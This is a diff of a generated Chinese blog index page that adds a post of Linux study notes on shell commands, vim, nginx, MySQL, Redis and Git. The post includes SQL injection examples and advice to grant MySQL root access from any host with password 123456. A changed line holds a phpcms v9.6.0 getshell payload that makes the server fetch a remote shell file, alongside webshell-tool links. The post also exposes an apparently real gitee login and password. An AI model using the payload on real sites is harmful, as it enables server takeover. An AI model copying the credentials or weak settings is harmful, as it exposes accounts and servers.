@@ -135,7 +135,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">24</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">25</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -188,6 +188,407 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/Linux%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Private">
+      <meta itemprop="description" content="程序语言记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PeacefulRace">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/17/Linux%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">linux基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-23 16:09:44" itemprop="dateModified" datetime="2022-10-23T16:09:44+08:00">2022-10-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-Linux命令格式"><a href="#1-Linux命令格式" class="headerlink" title="1.Linux命令格式"></a>1.Linux命令格式</h1><p>命令名称 [命名参数] [命名对象]</p>
+<h2 id="（1）获取登录信息-w-who-last"><a href="#（1）获取登录信息-w-who-last" class="headerlink" title="（1）获取登录信息-w/who/last"></a>（1）获取登录信息-w/who/last</h2><p>who am i – 获取当前用户信息</p>
+<p>Logout/exit – 登出当前用户</p>
+<p>w – 详细登录信息</p>
+<p>last – 历史登录信息</p>
+<h2 id="2-History-历史命令-c-清除历史"><a href="#2-History-历史命令-c-清除历史" class="headerlink" title="(2) History - 历史命令 -c 清除历史"></a>(2) History - 历史命令 -c 清除历史</h2><h2 id="3-Wget-通过网络获取文件"><a href="#3-Wget-通过网络获取文件" class="headerlink" title="(3) Wget - 通过网络获取文件"></a>(3) Wget - 通过网络获取文件</h2><p>-O 重命名下载的文件</p>
+<p>例如：wget <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python3.7.3/Python-3.7.3.tar.xz">https://www.python.org/ftp/python/python3.7.3/Python-3.7.3.tar.xz</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz</span><br><span class="line">tar -xvf Python-3.8.0a1.tgz</span><br></pre></td></tr></table></figure>
+
+<p> wget <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python3.7.3/Python-3.7.3.tar.xz">https://www.python.org/ftp/python/python3.7.3/Python-3.7.3.tgz</a></p>
+<h2 id="4-Xz-z-压缩-d-解压缩"><a href="#4-Xz-z-压缩-d-解压缩" class="headerlink" title="(4) Xz -z 压缩 -d 解压缩"></a>(4) Xz -z 压缩 -d 解压缩</h2><h2 id="5-Tar-xvf解归档-cvf-创建归档文件"><a href="#5-Tar-xvf解归档-cvf-创建归档文件" class="headerlink" title="(5) Tar -xvf解归档 -cvf 创建归档文件"></a>(5) Tar -xvf解归档 -cvf 创建归档文件</h2><h2 id="6-Cat-n-添加行号-cat-n-taobao-html-more"><a href="#6-Cat-n-添加行号-cat-n-taobao-html-more" class="headerlink" title="(6) Cat -n 添加行号 cat -n taobao.html | more"></a>(6) Cat -n 添加行号 cat -n taobao.html | more</h2><h2 id="7-管道-将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）"><a href="#7-管道-将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）" class="headerlink" title="(7)  | 管道 - 将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）"></a>(7)  | 管道 - 将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）</h2><h2 id="8-2-gt-错误输出重定向"><a href="#8-2-gt-错误输出重定向" class="headerlink" title="(8) 2&gt; - 错误输出重定向"></a>(8) 2&gt; - 错误输出重定向</h2><h2 id="9-2-gt-gt-错误追加输出重定向"><a href="#9-2-gt-gt-错误追加输出重定向" class="headerlink" title="(9) 2&gt;&gt; - 错误追加输出重定向"></a>(9) 2&gt;&gt; - 错误追加输出重定向</h2><h2 id="10-Nginx-Web服务器（HTTP服务器）-反向代理服务器"><a href="#10-Nginx-Web服务器（HTTP服务器）-反向代理服务器" class="headerlink" title="(10) Nginx - Web服务器（HTTP服务器）/反向代理服务器"></a>(10) Nginx - Web服务器（HTTP服务器）/反向代理服务器</h2><p>nginx 启用</p>
+<p>Nginx -s stop 停止</p>
+<h2 id="11-Yum-list-installed-grep-nginx-–-grep查询字符串"><a href="#11-Yum-list-installed-grep-nginx-–-grep查询字符串" class="headerlink" title="(11) Yum list installed | grep nginx – grep查询字符串"></a>(11) Yum list installed | grep nginx – grep查询字符串</h2><h2 id="12-Yum-y-–自动同意所有询问"><a href="#12-Yum-y-–自动同意所有询问" class="headerlink" title="(12) Yum -y –自动同意所有询问"></a>(12) Yum -y –自动同意所有询问</h2><h2 id="13-Gcc-–version-C语言编译器"><a href="#13-Gcc-–version-C语言编译器" class="headerlink" title="(13) Gcc –version C语言编译器"></a>(13) Gcc –version C语言编译器</h2><h2 id="14-源代码构建安装Python解释器"><a href="#14-源代码构建安装Python解释器" class="headerlink" title="(14) 源代码构建安装Python解释器"></a>(14) 源代码构建安装Python解释器</h2><p>下载: wget <a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz">https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz</a></p>
+<p>解压缩和解归档：xz -d xxx.xz/tar -xvf xxx.tar</p>
+<p>补充依赖库：</p>
+<p>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</p>
+<p>进入Python源代码目录安装前准备工作：</p>
+<p>cd pythonxxx</p>
+<p>./configure –prefix=usr/local/python38 –enable-optimizations</p>
+<p>构建和安装：make &amp;&amp; make install</p>
+<p>注册PATH环境变量：</p>
+<p>Cd ~</p>
+<p>Vim .bash_profile</p>
+<p>PATH=…:/usr/local/python38/bin</p>
+<p>激活环境变量：source .bash_profile</p>
+<p>测试安装是否成功：python3 –version</p>
+<p>创建链接：</p>
+<p>- 硬链接：- ln /code/example01.py /root/xxx (给磁盘文件增加了新的引用，只要引用数不为0文件就不会消失)</p>
+<p>- 软链接：- ln -s /usr/local/python38/bin/python3 /usr/bin/python3（相当于windows系统下的快捷方式）</p>
+<h2 id="15-Ls-l长格式查看"><a href="#15-Ls-l长格式查看" class="headerlink" title="(15) Ls -l长格式查看"></a>(15) Ls -l长格式查看</h2><p>-rwxr-xr-x 当前文件r:可读w:可写x:可执行</p>
+<h2 id="16-VIM编辑模式："><a href="#16-VIM编辑模式：" class="headerlink" title="(16) VIM编辑模式："></a>(16) VIM编辑模式：</h2><p>I/a: 编辑</p>
+<p>Esc: 退出编辑–&gt;命令模式–&gt; :或/ 末行模式</p>
+<p>:q 退出</p>
+<p>:set nu 显示行号</p>
+<p>:set nonu 去掉行号</p>
+<p>:set ts=4 tab键占位数</p>
+<p>Shift+zz/:wq ： 保存退出</p>
+<p>:syntax on 高亮语法/颜色代码 off关掉</p>
+<p>:set ruler 显示光标所在位置 set noruler关闭</p>
+<p>命令模式下输入G移动光标到末尾，500G表示光标移动到第500行；gg - 移到开头</p>
+<p>上下左右移动光标：hjkl -左下右上（前面可以加数字）</p>
+<p>Ctrl+y/ctrl+e：移动一行</p>
+<p>Ctrl+f/ctrl+b：翻一页</p>
+<p>0/$：移到行首行尾</p>
+<p>W: 移到下一个单词</p>
+<p>dd: 光标所在行删除一行，100dd删除100行</p>
+<p>yy: 复制光标所在行，10yy从所在行复制10行</p>
+<p>P: 粘贴，5P粘贴5次</p>
+<p>U: 撤销 / ctrl+R恢复</p>
+<p>多文件操作：</p>
+<p>:ls 显示所有同时打开的文件</p>
+<p>:b 2 切换到第二个文件</p>
+<p>:vs 垂直分屏</p>
+<p>:sp 水平分屏</p>
+<p>Ctrl+ww 切换分屏</p>
+<p>:qa 退出所有分屏</p>
+<p>:wqa 保存退出</p>
+<p>Vim -d 文件1 文件2 - 打开多文件进行版本比较</p>
+<p>映射快捷键：</p>
+<p>- map <F2> gg9999dd 清空命令行</p>
+<p>- inoremap _main if <strong>name</strong>== ‘__main__’:</p>
+<h2 id="17-Alias-hao-’ls-laR’-把常用命令设置别名"><a href="#17-Alias-hao-’ls-laR’-把常用命令设置别名" class="headerlink" title="(17) Alias hao=’ls -laR’ 把常用命令设置别名"></a>(17) Alias hao=’ls -laR’ 把常用命令设置别名</h2><p>①   Unalias hao 取消别名</p>
+<h2 id="18-宏操作："><a href="#18-宏操作：" class="headerlink" title="(18) 宏操作："></a>(18) 宏操作：</h2><p>录制宏：qa (a是寄存器的名字) - recording</p>
+<p>结束录制：q</p>
+<p>播放宏：@a</p>
+<h2 id="19-查找和替换："><a href="#19-查找和替换：" class="headerlink" title="(19) 查找和替换："></a>(19) 查找和替换：</h2><p>查找 - ？或者/ - /idx - 支持正则</p>
+<p>N / n - 正向搜索/反向搜索</p>
+<p>替换 - :1,$s/idx/index/cgie</p>
+<p> - c - confirm - 确认</p>
+<p> - g - global - 全局(一行出现多出匹配全部找出)</p>
+<p> - i - ignore case - 忽略大小写</p>
+<p> - e - error - 忽略错误</p>
+<h2 id="20-查找命令："><a href="#20-查找命令：" class="headerlink" title="(20) 查找命令："></a>(20) 查找命令：</h2><p> - grep - 搜索字符串(支持正则表达式)</p>
+<p> - find - 搜索文件</p>
+<p>-name - 根据名字搜索 - find / -name “*.html”</p>
+<p>-size - 根据大小搜索 - -10M / +10M</p>
+<p>-type - 根据类型搜索 - d / f / l / s</p>
+<p>-atime - 最后访问时间</p>
+<p>-mtime - 最后修改时间 - find . -mtime 0</p>
+<p>-ctime - 创建时间</p>
+<h2 id="21-网络相关命令："><a href="#21-网络相关命令：" class="headerlink" title="(21) 网络相关命令："></a>(21) 网络相关命令：</h2><p>- ssh - 安全远程连接 - 例如：ssh <a href="mailto:root@xx.xxx.xxx.xx(云服务器公网ip)">root@xx.xxx.xxx.xx(云服务器公网ip)</a></p>
+<p>- scp - 安全文件拷贝 - 例如：scp -r /root/code <a href="mailto:root@xx.xxx.xxx.xx:/root/code">root@xx.xxx.xxx.xx:/root/code</a></p>
+<p>- sftp - 安全文件传输（file transfer protocol）- 例如：sftp <a href="mailto:root@xx.xxx.xxx.xx">root@xx.xxx.xxx.xx</a></p>
+<p>-put - 上传</p>
+<p>-get - 下载</p>
+<p>-bye - 退出</p>
+<p>-help 查看帮助</p>
+<p>-lls 本地列出文件</p>
+<p>-ping - 检查网络可达性 - ICMP - Internet Control Management Protocol - 网络层</p>
+<p> - ttl - time to live</p>
+<p> - ping to death - DDoS - Distributed Deny of Service - 分布式拒绝服务攻击</p>
+<p>-ifconfig / ip</p>
+<p>- 127.0.0.1 - 回环地址 - localhost</p>
+<p>-netstat</p>
+<p>- netstat -nap | grep 进程或端口</p>
+<p>-p - process - 查看进程信息（进程编号和进程名字）</p>
+<p>- kill 进程号</p>
+<h2 id="22-nginx启动停止重启服务："><a href="#22-nginx启动停止重启服务：" class="headerlink" title="(22) nginx启动停止重启服务："></a>(22) nginx启动停止重启服务：</h2><p>Service nginx start</p>
+<p>Systemctl start nginx</p>
+<p>Systemctl stop nginx</p>
+<p>Systemctl restart nginx</p>
+<p>Systemctl status nginx</p>
+<p>Systemctl enable nginx - 开机自启</p>
+<p>Systemctl disable nginx</p>
+<h2 id="23-进程操作相关命令："><a href="#23-进程操作相关命令：" class="headerlink" title="(23) 进程操作相关命令："></a>(23) 进程操作相关命令：</h2><p>~命令+&amp; - 把命令放到后台运行</p>
+<p>Ctrl+z - 把前台命令停止并放到后台运行</p>
+<p>bg %编号 - 重新运行已停止的命令</p>
+<p>~ ps - processes - 例如：ps -ef | grep redis | grep -v grep 不显示grep信息</p>
+<p>~kill - 结束进程</p>
+<p>~jobs - 查看后台运行或停止的进程</p>
+<p>~fg - foreground - 将后台命令至于前台</p>
+<p>~bg - background - 让命令在后台运行 ctl+z</p>
+<p>~top - 任务管理器 q退出</p>
+<h2 id="24-centos7-命令行界面上下翻页"><a href="#24-centos7-命令行界面上下翻页" class="headerlink" title="(24) centos7 命令行界面上下翻页:"></a>(24) centos7 命令行界面上下翻页:</h2><p>shift + pageup 上翻</p>
+<p>shift + pagedown 下翻</p>
+<h2 id="25-Linux下命令行中的复制和粘贴"><a href="#25-Linux下命令行中的复制和粘贴" class="headerlink" title="(25) Linux下命令行中的复制和粘贴:"></a>(25) Linux下命令行中的复制和粘贴:</h2><p>安装gpm：yum install -y gpm*</p>
+<p>开启gpm服务：systemctl start gpm</p>
+<p>按住鼠标左键，选中想要复制的内容，松开就完成复制，再在复制的位置按右键就完成粘贴。</p>
+<h2 id="26-数据库："><a href="#26-数据库：" class="headerlink" title="(26) 数据库："></a>(26) 数据库：</h2><p>关系型数据库 - Oracle / MySQL / MariaDB - 二维表</p>
+<p>非关系型数据库 - MongoDB / Redis / ElasticSearch - 文档数据库/KV数据库</p>
+<p>Yum install -y mariadb mariadb-server</p>
+<p>Mysqld - MySQL Daemon - 守护进程 </p>
+<p>Rpm -ivh mysql-5.7.34-1.el7.x86_64.rpm</p>
+<p>Rpm -e 擦除</p>
+<p>Systemctl start mariadb - 启动mysql</p>
+<p>Mysql -u root -p - 连接mysql</p>
+<p>Use mysql</p>
+<p>修改mysql密码</p>
+<p>Update user set password=password(‘123456’) where user=’root’;</p>
+<p>Flush privileges;</p>
+<p>10.4版本以后：</p>
+<p>select user, password, host from user; # 查询已有用户</p>
+<p>SET PASSWORD FOR ‘bob‘@’%.loc.gov’ = PASSWORD(‘newpass’); # 根据用户及host修改密码</p>
+<p>SET PASSWORD FOR ‘bob‘@localhost = PASSWORD(“”); # # 根据用户及host删除密码</p>
+<p>delete from user where user=’XXX’ and host=’localhost’; ## 指定域及用户删除用户</p>
+<p>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION; 创建一个用户能使用root从任何主机连接到mysql服务器。</p>
+<p>—Redis数据库：</p>
+<p><a target="_blank" rel="noopener" href="https://redis.io/">https://redis.io</a></p>
+<p><a target="_blank" rel="noopener" href="https://redisdoc.com/">https://redisdoc.com</a> 使用手册</p>
+<p>下载Radis:</p>
+<p>Wget <a target="_blank" rel="noopener" href="https://download.redis.io/releases/redis-6.2.2.tar.gz?_ga=2.183820325.200813573.1619352920-1877153441.1619352920">https://download.redis.io/releases/redis-6.2.2.tar.gz?_ga=2.183820325.200813573.1619352920-1877153441.1619352920</a></p>
+<p>解压缩解归档</p>
+<p>安装：make &amp;&amp; make install</p>
+<p>redis:编译时报错 /bin/sh: cc: command not found：</p>
+<p>补依赖项：yum -y install gcc gcc-c++ libstdc++-devel</p>
+<p>【Redis】编译错误zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory：</p>
+<p>–make MALLOC=libc</p>
+<p>–redis-server –version - 查看是否安装成功</p>
+<p>–redis-sever &amp; - 启动redis服务(&amp;表示后台运行)</p>
+<p>–netstat -nap | grep 6379或 ps -ef | grep redis | grep -v grep 或 jobs - 查看redis服务启动是否成功</p>
+<p>–redis-server –requirepass 123456 &amp; - 带密码启动</p>
+<p>–redis-cli - 客户端访问 - auth 123456 - 输密码</p>
+<p>–redis-cli – 关闭redis</p>
+<p>–shutdown</p>
+<h2 id="27-安装和使用Git"><a href="#27-安装和使用Git" class="headerlink" title="(27) 安装和使用Git:"></a>(27) 安装和使用Git:</h2><p>​    Git官网：<a target="_blank" rel="noopener" href="http://git-scm.com/">http://git-scm.com/</a></p>
+<p>点击Tarballs，右击选择复制所需文件的下载链接地址</p>
+<p>Wget + 链接地址</p>
+<p>解压缩： xz -d xxx.tar.xz</p>
+<p>解归档：tar -xvf xxx.tar</p>
+<p>安装依赖项：yum install libcurl-devel； yum install zlib-devel</p>
+<p>安装GIT: ./configure –prefix=/usr/local/</p>
+<p> Make $$ make install</p>
+<p> Git –version</p>
+<p>版本控制：</p>
+<p>1990s - CVS / VSS - 锁定模式</p>
+<p>2000 - Subversion(SVN) - 合并模式</p>
+<p>必须有版本控制的中央服务器才能使用版本控制 - 中央集权型的版本控制系统</p>
+<p>分布式版本控制系统 - 2005 - Git</p>
+<p>Git / Mercury</p>
+<p>—Git命令：</p>
+<p>Git init - 将文件夹初始化为Git仓库</p>
+<p>Git add xxxx - 添加文件到git仓库</p>
+<p>Git status - 查看添加状态</p>
+<p>Git add . - 添加当前目录所有文件</p>
+<p>Git commit -m ‘提交说明’ - 提交命令</p>
+<p>按提示设置账户默认ID</p>
+<p>Git log - 查看日志</p>
+<p>若使用 rm -f *误删除：git checkout – . 恢复所有文件</p>
+<p>或使用 git log 查看commit一栏前6位作为ID</p>
+<p>Git reset –hard <ID> - 回到指定版本</p>
+<p>git reset –hard HEAD^ - 回到上一版本</p>
+<p>Git reflog 查看已修改过版本</p>
+<p>—国内代码托管平台：gitee /coding</p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/">https://gitee.com</a> – account: <a href="mailto:1174185292@qq.com">1174185292@qq.com</a> Z110112WILOVEME</p>
+<p><a target="_blank" rel="noopener" href="https://coding.net/">https://coding.net</a></p>
+<p>Git clone <a target="_blank" rel="noopener" href="https://gitee.com/zwzwzw001/python001.git">https://gitee.com/zwzwzw001/python001.git</a> - 从网站克隆到本地</p>
+<p>-git push - 将本地代码推到服务器</p>
+<p>=git pull - 将服务器更新同步到本地</p>
+<p> -git branch 分支管理</p>
+<p>-git branch develop 创建名为“develop“分支</p>
+<p>-git checkout 切换分支  / 代码还原  / 代码回滚</p>
+<p>-git checkout -b develop 创建并切换到名为“develop“分支</p>
+<p>-git remote 远程管理</p>
+<p>-git diff 差异对比</p>
+<p>-git difftool –tool=vimdiff</p>
+<p>-git merge 合并</p>
+<h2 id="28-centos不小心删除-root目录该如何解决"><a href="#28-centos不小心删除-root目录该如何解决" class="headerlink" title="(28) centos不小心删除/root目录该如何解决?"></a>(28) centos不小心删除/root目录该如何解决?</h2><p>1.直接创建/root目录；mkdir /root</p>
+<p>2.复制/etc/skel/下的隐藏文件到/root目录下；cp /etc/skel/.bash* /root</p>
+<p>3.重启即可</p>
+<h2 id="29-数据库-数据的仓库-database-实现数据持久化和数据管理"><a href="#29-数据库-数据的仓库-database-实现数据持久化和数据管理" class="headerlink" title="(29) 数据库 - 数据的仓库 - database - 实现数据持久化和数据管理"></a>(29) 数据库 - 数据的仓库 - database - 实现数据持久化和数据管理</h2><p>持久化 - 将数据从内存转移到能够长久保存数据的存储介质的过程</p>
+<p>保证数据的完整性和一致性</p>
+<p>完整性：</p>
+<p>\1. 实体完整性 - 每一个实体都是独一无二的，没有冗余 - 主键/唯一索引</p>
+<p>\2. 参照完整性 - 外键</p>
+<p>\3. 域完整性 - 录入的数据都是有效的数据 - 数据类型/数据长度/非空约束/默认值约束/检查约束</p>
+<p>Alter table tb_score add constraint ck_score_scmark check (scmark between 0 and 100);</p>
+<p>一致性：事务 - 要么全成功要么全失败，操作不可分割 - ACID特性</p>
+<p>\1. A - Atomicity - 原子性 - 不可分割</p>
+<p>\2. C - Consistency - 一致性 - 事务前后数据状态要一致</p>
+<p>\3. I - Isolation - 隔离性 - 并发的多个事务不知道彼此的中间状态</p>
+<p>\4. D - Duration - 持久性 - 事务完成后数据要做持久化</p>
+<p>分类：关系型数据库(SQL)和非关系型数据库(NoSQL)</p>
+<p>- 文档数据库 - MongoDB / ElasticSearch</p>
+<p>- 键值对数据库 - Redis - 内存 - 单线程+异步I/O （多路I/O复用）</p>
+<p>- 列族数据库</p>
+<p>- 图数据库</p>
+<p>计算密集型应用 - 多进程 + 多线程</p>
+<p>I/O密集型应用 - 单线程 + 异步I/O (协程（微线程）)</p>
+<p>2008年 - LLOOGG - log(日志)</p>
+<p>MySQL - Redis - REmote DIctionary Server</p>
+<p>Github / Twitter / Sina / </p>
+<p>冷数据（不经常使用）/ 热数据（经常使用）</p>
+<p>\1. 高速缓存服务（用户经常访问的数据从数据库搬到内存）</p>
+<p>\2. 实时排行榜</p>
+<p>\3. 投票点赞</p>
+<p>\4. 消息队列</p>
+<p>Yum install redis</p>
+<p>源代码构建安装 make &amp;&amp; make install</p>
+<p>Redis-server –port 1234 –requirepass 123456 –appendonly yes</p>
+<p>Redis-server –requirepass 123456 &gt; redis.log&amp;</p>
+<p>Redis-server 配置文件(redis.conf) &gt; redis.log &amp;</p>
+<p>启动Redis客户端：</p>
+<p>Redis-cli -h 主机IP地址 -p 端口（默认6379）</p>
+<p>主机：端口&gt;auth 密码</p>
+<p>主机：端口&gt;ping</p>
+<p>&gt;keys *</p>
+<p>&gt;type </p>
+<p>Redis 命令参考 - <a target="_blank" rel="noopener" href="http://redisdoc.com/">http://redisdoc.com/</a></p>
+<p>哈希存储 - 性能非常好的存储方案 – set(集合)</p>
+<p>Obj — 哈希函数 —&gt; 哈希码（散列码） —&gt; 对象在内存中存储的位置</p>
+<p>文件 —&gt; MD5 / SHA1 / SHA256 —&gt; 哈希码（数字指纹/签名）</p>
+<p>哈希表</p>
+<p>hmset stu1 id 1001 name xxx sex male te1 11323232xxx</p>
+<p>Hget stu1 name</p>
+<p>Hmget stu1 name sex tel</p>
+<p>Hvals stu1</p>
+<p>Hgetall stu1</p>
+<p>Hdel stu1 tel </p>
+<p>- Redis主从复制读写分离</p>
+<p>Redis-server –slaveof [主ip] 6379 –masterauth 123456 &gt; redis.log &amp;</p>
+<p>info replication # 查看主从复制信息exitexit</p>
+<p>Slaveof no one</p>
+<p>-Redis修复持久化文件的工具</p>
+<p>-dump.rdb文件误删解决方法</p>
+<p>redis-server –requirepass 123456 –appendonly yes &gt; redis.log &amp; # 生成.aof文件的保存方式</p>
+<p>Redis-check-aof –fix appendonly.aof</p>
+<p>Redis-check-rdb –fix dump.rdb</p>
+<p>Tornado / Node.js</p>
+<p>文件系统 / 层次数据库 / 网状数据库</p>
+<p>- 关系型数据库：</p>
+<p>- 理论基础：关系代数和集合论</p>
+<p>-具体表象：用二维表来保存数据 - 学生表</p>
+<p>=行：一条记录 - 一个学生的信息</p>
+<p>-列：一个字段 - 学生的属性</p>
+<p>-主键列：能够唯一标识一条记录的列，如学号</p>
+<p>-编程语言：SQL - 结构化查询语言</p>
+<p>- DDL - 数据定义语言 - create / drop / alter</p>
+<p>- create database xxx default charset utf8mb4; - 创建名为xxx的数据库</p>
+<p>- use school;</p>
+<p>- show tables;</p>
+<p>- create user ‘root’@’%’ identified by ‘123456’; 添加访问权限</p>
+<p>- flush privileges</p>
+<p>- grant all privileges on <em>.</em> to ‘root’@’%’ with grant option; 允许所有客户端连接</p>
+<p>- flush privileges</p>
+<p>- drop database if exists xxx - 删除xxx数据库</p>
+<p>- ？ data types - 查看数据类型</p>
+<p>- ？ int - int类型描述</p>
+<p>- DML - 数据操作语言 - insert / delete / update / select</p>
+<p>- DCL - 数据控制语言 - grant / revoke</p>
+<p>-产品：Oracle - 甲骨文</p>
+<p>IBM DB2</p>
+<p>Microsoft SQLServer</p>
+<p>Sybase</p>
+<p>MySQL</p>
+<p>PostgreSQL</p>
+<p>SQLite</p>
+<p>学生（学号、姓名、性别、生日、家庭住址）</p>
+<p>学院（编号、名称、网址、。。。。）</p>
+<p>插入不少于3条学院记录</p>
+<p>实体：学生、学院</p>
+<p>关系：属于</p>
+<p>重数：多对一</p>
+<p>– 一对一重数关系</p>
+<p>create table tb_person</p>
+<p>(</p>
+<p>pid int auto_increment,</p>
+<p>pname varchar(50),</p>
+<p>primary key (pid)</p>
+<p>);</p>
+<p>create table tb_idcard</p>
+<p>(</p>
+<p>cid int auto_increment,</p>
+<p>cno char(18) not null,</p>
+<p>ps varchar(255) not null,</p>
+<p>expire date not null,</p>
+<p>pid int not null,</p>
+<p>PRIMARY key (cid)</p>
+<p>);</p>
+<p>alter table tb_idcard add CONSTRAINT fk_card_pid foreign key (pid) REFERENCES tb_person (pid);</p>
+<p>– 一对一是多对一的特例，加上唯一性约束</p>
+<p>alter table tb_idcard add CONSTRAINT uni_card_pid unique (pid);</p>
+<p>–SQL注射攻击：</p>
+<p>tb_user</p>
+<p>Userid    username     userpass …</p>
+<p>1          admin        123456</p>
+<p>select * from tb_user where username=’%s’ and password=’%s’</p>
+<p>Username=admin</p>
+<p>Password=’x’ or ‘1’=’1’</p>
+<p>‘; update … where ‘1’ = ‘1’</p>
+<p>select * from tb_user where username=’admin’ and password=’x’ or ‘1’=’1’</p>
+<p>select * from tb_user where username=’admin’ and password=’‘; update … where ‘1’ = ‘1’</p>
+<p># 向表中添加数据应避免用字符串拼接，防止SQL注射攻击。</p>
+<h1 id="—-防火墙"><a href="#—-防火墙" class="headerlink" title="— 防火墙"></a>— 防火墙</h1><p>开启：systemctl start firewalld</p>
+<p>添加80端口：firewall-cmd –add-port=80/tcp –permanent</p>
+<p>重启：systemctl restart firewalld</p>
+<p>firewalld和iptables</p>
+<p>If you haven’t any real data in your database then clear all in /var/lib/mysql.</p>
+<p>After that try again to run command mysql_install_db –user=mysql –basedir=/usr –datadir=/var/lib/mysql to initialize database directory.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1587,7 +1988,7 @@
 <p>脚本语言：php中间件：iis6.0，nginx；cms：phpcms V9.6.0</p>
 <p>漏洞利用文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/">http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/</a></p>
 <p>​    —相关工具</p>
-<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href="mailto:&#115;&#115;&#x65;&#x76;&#x65;&#110;&#x73;&#x73;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;">&#115;&#115;&#x65;&#x76;&#x65;&#110;&#x73;&#x73;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;</a>&amp;info[content]= src=<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
+<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href="mailto:&#115;&#115;&#x65;&#x76;&#x65;&#x6e;&#x73;&#x73;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#115;&#115;&#x65;&#x76;&#x65;&#x6e;&#x73;&#x73;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;</a>&amp;info[content]= src=<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
 <p>​       中国蚁剑：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87517612">https://blog.csdn.net/qq1045553189/article/details/87517612</a></p>
 <p>​       蚁剑目录：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
 <p>​       加速器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
@@ -4499,239 +4900,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-python/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Private">
-      <meta itemprop="description" content="程序语言记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="PeacefulRace">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
